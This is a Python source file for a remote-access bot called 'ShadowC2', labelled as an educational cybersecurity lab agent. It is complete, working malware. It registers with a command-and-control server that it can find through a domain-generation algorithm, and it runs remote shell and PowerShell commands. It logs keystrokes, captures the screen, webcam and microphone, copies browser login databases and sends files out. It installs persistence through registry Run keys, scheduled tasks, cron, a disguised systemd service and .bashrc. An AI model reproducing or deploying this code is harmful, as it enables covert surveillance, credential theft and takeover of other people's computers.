#!/usr/bin/env python3
"""
ShadowC2 Bot - Python Agent (Fixed Version)
Laboratorio de Ciberseguridad - Uso Educativo

Fixes aplicados:
- Fallback a C2_IP cuando DGA falla
- Reintento de registro en el loop principal
- Logging de errores de conexion
- Timeout mas corto para detectar servidor caido
"""

import os
import sys
import json
import base64
import socket
import platform
import subprocess
import threading
import time
import random
import hashlib
import urllib.request
import urllib.error
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ============ CONFIGURACION C2 ============
C2_DOMAIN = "shadowc2.local"
C2_IP = "127.0.0.1"
C2_PORT = 8000
C2_PROTOCOL = "http"
SLEEP_TIME = 30
JITTER = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ============ CRYPTO ============
class ShadowCrypto:
    """AES-256-GCM encryption for C2 communications"""
    
    def __init__(self, key: bytes = None):
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            if key is None:
                key = os.urandom(32)
            self.key = key
            self.aesgcm = AESGCM(self.key)
            self.available = True
        except ImportError:
            self.available = False
            self.key = key or os.urandom(32)
    
    def encrypt(self, plaintext: bytes, associated_data: bytes = None) -> bytes:
        if not self.available:
            return b'XOR' + bytes([p ^ self.key[i % len(self.key)] for i, p in enumerate(plaintext)])
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, associated_data)
        return nonce + ciphertext
    
    def decrypt(self, ciphertext: bytes, associated_data: bytes = None) -> bytes:
        if not self.available:
            if ciphertext[:3] == b'XOR':
                ct = ciphertext[3:]
                return bytes([c ^ self.key[i % len(self.key)] for i, c in enumerate(ct)])
            return ciphertext
        nonce = ciphertext[:12]
        ct = ciphertext[12:]
        return self.aesgcm.decrypt(nonce, ct, associated_data)
    
    def encrypt_b64(self, plaintext: bytes, associated_data: bytes = None) -> str:
        return base64.b64encode(self.encrypt(plaintext, associated_data)).decode()
    
    def decrypt_b64(self, ciphertext: str, associated_data: bytes = None) -> bytes:
        return self.decrypt(base64.b64decode(ciphertext), associated_data)

# ============ DGA ============
class DGAEngine:
    """Domain Generation Algorithm for resilient C2"""
    
    def __init__(self, seed: str = "shadowc2"):
        self.seed = seed
    
    def generate_domains(self, date_str: str = None, count: int = 10) -> List[str]:
        if date_str is None:
            date_str = datetime.now().strftime("%Y%m%d")
        
        domains = []
        for i in range(count):
            data = f"{self.seed}{date_str}{i}".encode()
            hash_val = hashlib.md5(data).hexdigest()
            tld = random.choice(['.com', '.net', '.org', '.info', '.biz'])
            domain = f"{hash_val[:12]}{tld}"
            domains.append(domain)
        return domains
    
    def get_c2_domain(self) -> str:
        """Get working C2 domain from DGA list"""
        domains = self.generate_domains()
        for domain in domains:
            try:
                socket.gethostbyname(domain)
                return domain
            except:
                continue
        return C2_DOMAIN

# ============ SYSTEM INFO ============
def get_system_info() -> Dict:
    """Gather system information for bot registration"""
    info = {
        'hostname': socket.gethostname(),
        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
        'os': platform.system(),
        'os_version': platform.version(),
        'arch': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version(),
        'ip': get_external_ip(),
        'privileges': 'admin' if is_admin() else 'user',
        'country': get_country(),
    }
    return info

def get_external_ip() -> str:
    try:
        req = urllib.request.Request(
            'https://api.ipify.org',
            headers={'User-Agent': USER_AGENT}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode().strip()
    except:
        return '127.0.0.1'

def get_country() -> str:
    try:
        req = urllib.request.Request(
            'https://ipapi.co/country/',
            headers={'User-Agent': USER_AGENT}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode().strip()
    except:
        return 'XX'

def is_admin() -> bool:
    try:
        if platform.system() == 'Windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

# ============ C2 COMMUNICATION ============
class C2Client:
    """C2 Communication Client - FIXED"""
    
    def __init__(self, bot_id: str, crypto_engine: ShadowCrypto):
        self.bot_id = bot_id
        self.crypto = crypto_engine
        self.dga = DGAEngine()
        self.session_cookies = {}
        self.registered = False
    
    def _get_url(self, endpoint: str, use_ip: bool = False) -> str:
        """
        FIXED: Si use_ip=True o el DGA falla, usa C2_IP directamente.
        Esto permite conectar en entornos de laboratorio sin DNS.
        """
        if use_ip:
            return f"{C2_PROTOCOL}://{C2_IP}:{C2_PORT}{endpoint}"
        
        domain = self.dga.get_c2_domain()
        return f"{C2_PROTOCOL}://{domain}:{C2_PORT}{endpoint}"
    
    def _request(self, method: str, endpoint: str, data: Dict = None, use_ip: bool = False) -> Dict:
        """
        FIXED: Intenta primero con IP si use_ip=True, o fallback a IP si DGA falla.
        """
        url = self._get_url(endpoint, use_ip=use_ip)
        
        if data:
            json_data = json.dumps(data).encode()
            encrypted = self.crypto.encrypt_b64(json_data)
            payload = json.dumps({'data': encrypted}).encode()
        else:
            payload = None
        
        req = urllib.request.Request(
            url,
            data=payload,
            headers={
                'User-Agent': USER_AGENT,
                'Content-Type': 'application/json',
                'X-Bot-ID': self.bot_id,
            },
            method=method
        )
        
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
                resp_data = response.read()
                try:
                    resp_json = json.loads(resp_data)
                    if 'data' in resp_json:
                        decrypted = self.crypto.decrypt_b64(resp_json['data'])
                        return json.loads(decrypted)
                    return resp_json
                except:
                    return {'status': 'success', 'raw': resp_data.decode()}
        except urllib.error.HTTPError as e:
            return {'status': 'error', 'code': e.code, 'message': str(e)}
        except urllib.error.URLError as e:
            return {'status': 'error', 'type': 'urlerror', 'message': str(e.reason)}
        except Exception as e:
            return {'status': 'error', 'type': 'exception', 'message': str(e)}
    
    def register(self, system_info: Dict) -> bool:
        """
        FIXED: Intenta registro con IP primero (modo lab), luego con DGA.
        """
        data = {
            'bot_id': self.bot_id,
            **system_info,
            'version': '2.0',
            'sleep_time': SLEEP_TIME,
            'jitter': JITTER,
        }
        
        # Intento 1: Usar C2_IP directamente (modo laboratorio)
        print(f"[*] Trying registration via C2_IP: {C2_IP}:{C2_PORT}")
        resp = self._request('POST', '/api/bot/register', data, use_ip=True)
        
        if resp.get('status') == 'success':
            self.registered = True
            return True
        
        print(f"[-] IP registration failed: {resp.get('message', 'unknown error')}")
        
        # Intento 2: Usar DGA (modo produccion)
        print(f"[*] Trying registration via DGA domain...")
        resp = self._request('POST', '/api/bot/register', data, use_ip=False)
        
        if resp.get('status') == 'success':
            self.registered = True
            return True
        
        print(f"[-] DGA registration failed: {resp.get('message', 'unknown error')}")
        return False
    
    def heartbeat(self) -> Dict:
        """FIXED: Usa IP si ya sabemos que funciona, o intenta ambos."""
        if self.registered:
            # Si ya estamos registrados, usa la misma ruta que funciono
            return self._request('POST', f'/api/bot/heartbeat/{self.bot_id}', use_ip=True)
        return self._request('POST', f'/api/bot/heartbeat/{self.bot_id}', use_ip=True)
    
    def submit_result(self, command_id: int, status: str, output: str):
        data = {
            'command_id': command_id,
            'status': status,
            'output': output,
        }
        return self._request('POST', '/api/bot/result', data, use_ip=True)
    
    def submit_keylog(self, window_title: str, keystrokes: str):
        data = {
            'bot_id': self.bot_id,
            'window_title': window_title,
            'keystrokes': keystrokes,
        }
        return self._request('POST', '/api/bot/keylog', data, use_ip=True)
    
    def submit_screenshot(self, image_data: bytes):
        data = {
            'bot_id': self.bot_id,
            'image_data': base64.b64encode(image_data).decode(),
        }
        return self._request('POST', '/api/bot/screenshot', data, use_ip=True)
    
    def submit_webcam(self, image_data: bytes, duration: int = 0):
        data = {
            'bot_id': self.bot_id,
            'image_data': base64.b64encode(image_data).decode(),
            'duration': duration,
        }
        return self._request('POST', '/api/bot/webcam', data, use_ip=True)
    
    def submit_audio(self, audio_data: bytes, duration: int, sample_rate: int = 44100):
        data = {
            'bot_id': self.bot_id,
            'audio_data': base64.b64encode(audio_data).decode(),
            'duration': duration,
            'sample_rate': sample_rate,
        }
        return self._request('POST', '/api/bot/audio', data, use_ip=True)
    
    def submit_credentials(self, source: str, url: str, username: str, password: str):
        data = {
            'bot_id': self.bot_id,
            'source': source,
            'url': url,
            'username': username,
            'password': password,
        }
        return self._request('POST', '/api/bot/credentials', data, use_ip=True)
    
    def submit_lateral(self, target: str, technique: str, status: str, output: str):
        data = {
            'bot_id': self.bot_id,
            'target': target,
            'technique': technique,
            'status': status,
            'output': output,
        }
        return self._request('POST', '/api/bot/lateral', data, use_ip=True)
    
    def submit_privesc(self, technique: str, status: str, output: str, elevated_token: str = None):
        data = {
            'bot_id': self.bot_id,
            'technique': technique,
            'status': status,
            'output': output,
            'elevated_token': elevated_token,
        }
        return self._request('POST', '/api/bot/privesc', data, use_ip=True)

# ============ SHELL MODULE ============
class ShellModule:
    """Remote shell execution"""
    
    @staticmethod
    def execute(command: str) -> Tuple[str, str, int]:
        try:
            if platform.system() == 'Windows':
                shell = True
                executable = None
            else:
                shell = True
                executable = '/bin/bash'
            
            result = subprocess.run(
                command,
                shell=shell,
                executable=executable,
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return '', 'Command timed out', -1
        except Exception as e:
            return '', str(e), -1
    
    @staticmethod
    def execute_powershell(command: str) -> Tuple[str, str, int]:
        if platform.system() != 'Windows':
            return '', 'PowerShell only available on Windows', -1
        
        try:
            result = subprocess.run(
                ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', command],
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout, result.stderr, result.returncode
        except Exception as e:
            return '', str(e), -1

# ============ SCREENSHOT MODULE ============
class ScreenshotModule:
    """Screen capture functionality"""
    
    @staticmethod
    def capture() -> Optional[bytes]:
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            import io
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            return img_buffer.getvalue()
        except ImportError:
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                import io
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                return img_buffer.getvalue()
            except:
                return None
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None

# ============ KEYLOGGER MODULE ============
class KeyloggerModule:
    """Keylogger functionality"""
    
    def __init__(self, c2_client: C2Client):
        self.c2 = c2_client
        self.buffer = []
        self.window_title = ""
        self.running = False
        self.thread = None
    
    def start(self):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.running = False
    
    def _run(self):
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    char = key.char
                    self.buffer.append(char)
                except AttributeError:
                    special = str(key).replace('Key.', ' ')
                    self.buffer.append(special)
                
                if len(self.buffer) >= 50:
                    self._flush()
            
            def on_release(key):
                pass
            
            listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            listener.start()
            
            while self.running:
                time.sleep(30)
                self._flush()
                
        except ImportError:
            print("[-] pynput not available, keylogger disabled")
    
    def _flush(self):
        if not self.buffer:
            return
        
        keystrokes = ''.join(self.buffer)
        self.buffer = []
        
        try:
            if platform.system() == 'Windows':
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                self.window_title = buff.value
            else:
                self.window_title = "Unknown"
        except:
            self.window_title = "Unknown"
        
        self.c2.submit_keylog(self.window_title, keystrokes)

# ============ WEBCAM MODULE ============
class WebcamModule:
    """Webcam capture functionality"""
    
    @staticmethod
    def capture() -> Optional[bytes]:
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                import io
                _, buffer = cv2.imencode('.jpg', frame)
                return buffer.tobytes()
            return None
        except ImportError:
            return None
        except Exception as e:
            print(f"Webcam error: {e}")
            return None
    
    @staticmethod
    def capture_video(duration: int = 5) -> Optional[bytes]:
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            import tempfile
            temp_file = tempfile.NamedTemporaryFile(suffix='.avi', delete=False)
            temp_file.close()
            
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            out = cv2.VideoWriter(temp_file.name, fourcc, 20.0, (width, height))
            
            start_time = time.time()
            while time.time() - start_time < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            
            cap.release()
            out.release()
            
            with open(temp_file.name, 'rb') as f:
                data = f.read()
            
            os.unlink(temp_file.name)
            return data
        except:
            return None

# ============ AUDIO MODULE ============
class AudioModule:
    """Audio capture functionality"""
    
    @staticmethod
    def record(duration: int = 5, sample_rate: int = 44100) -> Optional[bytes]:
        try:
            import pyaudio
            import wave
            import io
            
            chunk = 1024
            format = pyaudio.paInt16
            channels = 1
            
            p = pyaudio.PyAudio()
            stream = p.open(format=format,
                          channels=channels,
                          rate=sample_rate,
                          input=True,
                          frames_per_buffer=chunk)
            
            frames = []
            for _ in range(0, int(sample_rate / chunk * duration)):
                data = stream.read(chunk, exception_on_overflow=False)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            wav_buffer = io.BytesIO()
            wf = wave.open(wav_buffer, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(format))
            wf.setframerate(sample_rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            return wav_buffer.getvalue()
        except ImportError:
            return None
        except Exception as e:
            print(f"Audio error: {e}")
            return None

# ============ BROWSER DATA MODULE ============
class BrowserDataModule:
    """Extract cookies and passwords from browsers"""
    
    @staticmethod
    def extract_chrome_data() -> List[Dict]:
        credentials = []
        
        try:
            import sqlite3
            
            paths = []
            if platform.system() == 'Windows':
                local_appdata = os.getenv('LOCALAPPDATA')
                paths = [
                    os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
                    os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                ]
            else:
                home = os.path.expanduser('~')
                paths = [
                    os.path.join(home, '.config', 'google-chrome', 'Default', 'Login Data'),
                    os.path.join(home, '.config', 'chromium', 'Default', 'Login Data'),
                ]
            
            for login_db in paths:
                if os.path.exists(login_db):
                    try:
                        import tempfile
                        temp_db = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
                        temp_db.close()
                        
                        import shutil
                        shutil.copy2(login_db, temp_db.name)
                        
                        conn = sqlite3.connect(temp_db.name)
                        cursor = conn.cursor()
                        
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            password = BrowserDataModule._decrypt_password(encrypted_password)
                            
                            credentials.append({
                                'source': 'chrome',
                                'url': url,
                                'username': username,
                                'password': password,
                            })
                        
                        conn.close()
                        os.unlink(temp_db.name)
                    except Exception as e:
                        print(f"Chrome extraction error: {e}")
        
        except ImportError:
            pass
        
        return credentials
    
    @staticmethod
    def extract_firefox_data() -> List[Dict]:
        credentials = []
        
        try:
            import sqlite3
            import glob
            
            if platform.system() == 'Windows':
                base_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            else:
                base_path = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')
            
            if os.path.exists(base_path):
                profiles = glob.glob(os.path.join(base_path, '*.default*'))
                for profile in profiles:
                    logins_json = os.path.join(profile, 'logins.json')
                    if os.path.exists(logins_json):
                        try:
                            with open(logins_json, 'r') as f:
                                data = json.load(f)
                            
                            for login in data.get('logins', []):
                                credentials.append({
                                    'source': 'firefox',
                                    'url': login.get('hostname', ''),
                                    'username': login.get('encryptedUsername', ''),
                                    'password': login.get('encryptedPassword', ''),
                                })
                        except:
                            pass
        
        except:
            pass
        
        return credentials
    
    @staticmethod
    def _decrypt_password(encrypted: bytes) -> str:
        try:
            if platform.system() == 'Windows':
                return "[encrypted - needs DPAPI]"
            else:
                return "[encrypted - needs master password]"
        except:
            return "[decryption failed]"
    
    @staticmethod
    def extract_all() -> List[Dict]:
        all_creds = []
        all_creds.extend(BrowserDataModule.extract_chrome_data())
        all_creds.extend(BrowserDataModule.extract_firefox_data())
        return all_creds

# ============ PERSISTENCE MODULE ============
class PersistenceModule:
    """Persistence mechanisms"""
    
    @staticmethod
    def install_windows() -> bool:
        try:
            import winreg
            
            exe_path = sys.executable
            script_path = os.path.abspath(__file__)
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "ShadowC2", 0, winreg.REG_SZ, f'"{exe_path}" "{script_path}"')
            winreg.CloseKey(key)
            
            task_name = "ShadowC2Update"
            cmd = f'schtasks /create /tn "{task_name}" /tr "\'{exe_path}\' \\"{script_path}\\"" /sc minute /mo 5 /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            return True
        except Exception as e:
            print(f"Windows persistence error: {e}")
            return False
    
    @staticmethod
    def install_linux() -> bool:
        try:
            script_path = os.path.abspath(__file__)
            
            cron_entry = f"*/5 * * * * /usr/bin/python3 {script_path}\n"
            
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            
            current_crontab = result.stdout if result.returncode == 0 else ""
            
            if script_path not in current_crontab:
                new_crontab = current_crontab + cron_entry
                proc = subprocess.Popen(
                    ['crontab', '-'],
                    stdin=subprocess.PIPE,
                    text=True
                )
                proc.communicate(input=new_crontab)
            
            if os.geteuid() == 0:
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
                service_path = '/etc/systemd/system/system-update.service'
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
                subprocess.run(['systemctl', 'enable', 'system-update.service'], capture_output=True)
            
            bashrc = os.path.expanduser('~/.bashrc')
            if os.path.exists(bashrc):
                with open(bashrc, 'a') as f:
                    f.write(f"\n# System update check\npython3 {script_path} &\n")
            
            return True
        except Exception as e:
            print(f"Linux persistence error: {e}")
            return False
    
    @staticmethod
    def install() -> bool:
        if platform.system() == 'Windows':
            return PersistenceModule.install_windows()
        else:
            return PersistenceModule.install_linux()

# ============ SLEEP OBFUSCATION ============
class SleepObfuscation:
    """Encrypt payload in memory during sleep"""
    
    def __init__(self):
        self.encrypted_payloads = {}
    
    def obfuscate_sleep(self, duration: int):
        jitter = random.randint(-JITTER, JITTER)
        actual_sleep = max(1, duration + jitter)
        time.sleep(actual_sleep)
    
    @staticmethod
    def encrypt_memory_region(data: bytes, key: bytes) -> bytes:
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# ============ MAIN BOT CLASS ============
class ShadowBot:
    """Main bot controller - FIXED"""
    
    def __init__(self):
        self.bot_id = self._generate_bot_id()
        self.crypto = ShadowCrypto()
        self.c2 = C2Client(self.bot_id, self.crypto)
        self.keylogger = None
        self.sleep_obf = SleepObfuscation()
        self.running = True
    
    def _generate_bot_id(self) -> str:
        hostname = socket.gethostname()
        random_suffix = hashlib.md5(os.urandom(16)).hexdigest()[:8]
        return f"{hostname}-{random_suffix}"
    
    def register(self):
        """Register bot with C2"""
        info = get_system_info()
        success = self.c2.register(info)
        if success:
            print(f"[+] Bot {self.bot_id} registered successfully")
        else:
            print(f"[-] Registration failed")
        return success
    
    def execute_command(self, command: str, args: str = None) -> Tuple[str, int]:
        
        if command == 'shell':
            stdout, stderr, rc = ShellModule.execute(args or '')
            return stdout + stderr, rc
        
        elif command == 'powershell':
            stdout, stderr, rc = ShellModule.execute_powershell(args or '')
            return stdout + stderr, rc
        
        elif command == 'screenshot':
            img_data = ScreenshotModule.capture()
            if img_data:
                self.c2.submit_screenshot(img_data)
                return "Screenshot captured and sent", 0
            return "Screenshot failed", 1
        
        elif command == 'webcam':
            img_data = WebcamModule.capture()
            if img_data:
                self.c2.submit_webcam(img_data)
                return "Webcam capture sent", 0
            return "Webcam capture failed", 1
        
        elif command == 'webcam_video':
            duration = int(args) if args else 5
            video_data = WebcamModule.capture_video(duration)
            if video_data:
                self.c2.submit_webcam(video_data, duration)
                return f"Video capture ({duration}s) sent", 0
            return "Video capture failed", 1
        
        elif command == 'audio':
            duration = int(args) if args else 5
            audio_data = AudioModule.record(duration)
            if audio_data:
                self.c2.submit_audio(audio_data, duration)
                return f"Audio recording ({duration}s) sent", 0
            return "Audio recording failed", 1
        
        elif command == 'keylogger_start':
            if not self.keylogger:
                self.keylogger = KeyloggerModule(self.c2)
            self.keylogger.start()
            return "Keylogger started", 0
        
        elif command == 'keylogger_stop':
            if self.keylogger:
                self.keylogger.stop()
            return "Keylogger stopped", 0
        
        elif command == 'credentials':
            creds = BrowserDataModule.extract_all()
            for cred in creds:
                self.c2.submit_credentials(
                    cred['source'],
                    cred['url'],
                    cred['username'],
                    cred['password']
                )
            return f"Extracted {len(creds)} credentials", 0
        
        elif command == 'persist':
            if PersistenceModule.install():
                return "Persistence installed", 0
            return "Persistence failed", 1
        
        elif command == 'info':
            info = get_system_info()
            return json.dumps(info, indent=2), 0
        
        elif command == 'sleep':
            global SLEEP_TIME
            SLEEP_TIME = int(args) if args else 30
            return f"Sleep time set to {SLEEP_TIME}", 0
        
        elif command == 'download':
            try:
                url = args
                req = urllib.request.Request(url, headers={'User-Agent': USER_AGENT})
                with urllib.request.urlopen(req, timeout=30) as response:
                    data = response.read()
                
                filename = os.path.basename(url) or 'downloaded_file'
                with open(filename, 'wb') as f:
                    f.write(data)
                return f"Downloaded {len(data)} bytes to {filename}", 0
            except Exception as e:
                return f"Download failed: {e}", 1
        
        elif command == 'upload':
            try:
                filepath = args
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    return f"FILE:{base64.b64encode(data).decode()}", 0
                return "File not found", 1
            except Exception as e:
                return f"Upload failed: {e}", 1
        
        elif command == 'kill':
            self.running = False
            return "Bot shutting down", 0
        
        else:
            return f"Unknown command: {command}", 1
    
    def run(self):
        """Main bot loop - FIXED"""
        print(f"[*] ShadowC2 Bot {self.bot_id} starting...")
        print(f"[*] C2 Target: {C2_PROTOCOL}://{C2_IP}:{C2_PORT}")
        
        # FIXED: Loop de registro con reintentos
        registered = False
        retry_count = 0
        max_retries = 5
        
        while not registered and retry_count < max_retries:
            registered = self.register()
            if not registered:
                retry_count += 1
                wait_time = min(60 * retry_count, 300)  # Backoff: 60s, 120s, 180s...
                print(f"[-] Registration attempt {retry_count}/{max_retries} failed. Retrying in {wait_time}s...")
                time.sleep(wait_time)
        
        if not registered:
            print("[-] Max registration retries reached. Exiting.")
            return
        
        print("[+] Entering main C2 loop...")
        
        while self.running:
            try:
                # Heartbeat and get commands
                resp = self.c2.heartbeat()
                
                if resp.get('status') == 'success':
                    commands = resp.get('commands', [])
                    
                    for cmd in commands:
                        cmd_id = cmd.get('id')
                        command = cmd.get('command')
                        args = cmd.get('args')
                        
                        print(f"[*] Executing: {command} {args}")
                        
                        try:
                            output, rc = self.execute_command(command, args)
                            status = 'completed' if rc == 0 else 'failed'
                        except Exception as e:
                            output = str(e)
                            status = 'error'
                        
                        self.c2.submit_result(cmd_id, status, output)
                
                elif resp.get('status') == 'error':
                    print(f"[-] Heartbeat error: {resp.get('message', 'unknown')}")
                
                # Sleep with obfuscation
                self.sleep_obf.obfuscate_sleep(SLEEP_TIME)
                
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(SLEEP_TIME)

# ============ ENTRY POINT ============
if __name__ == "__main__":
    bot = ShadowBot()
    bot.run()
